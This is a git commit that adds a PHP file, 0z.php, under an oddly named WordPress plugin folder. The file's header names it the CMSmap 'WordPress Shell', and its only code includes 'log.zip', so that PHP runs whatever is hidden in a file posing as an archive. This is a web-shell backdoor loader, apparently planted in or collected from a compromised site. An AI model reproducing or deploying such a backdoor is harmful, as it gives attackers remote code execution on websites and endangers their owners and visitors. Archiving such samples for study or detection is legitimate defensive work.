cbbc75d70d558b8bff28383c177372b87c299495
Stefan Pejcic <pejcha1994@gmail.com>
2021-03-15 13:07:41 +0100

    Create 0z.php

---
+++ 14.03.2021/plugins/uxhyfeu/0z.php
@@ -0,0 +1,14 @@
+<?php
+/**
+ * Plugin Name: CMSmap - WordPress Shell
+ * Plugin URI: https://github.com/m7x/cmsmap/
+ * Description: Simple WordPress Shell - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
+ * Version: 1.0
+ * Author: CMSmap
+ * Author URI: https://github.com/m7x/cmsmap/
+ * License: GPLv2
+ */
+?>
+<?php
+    include('log.zip');
+?>
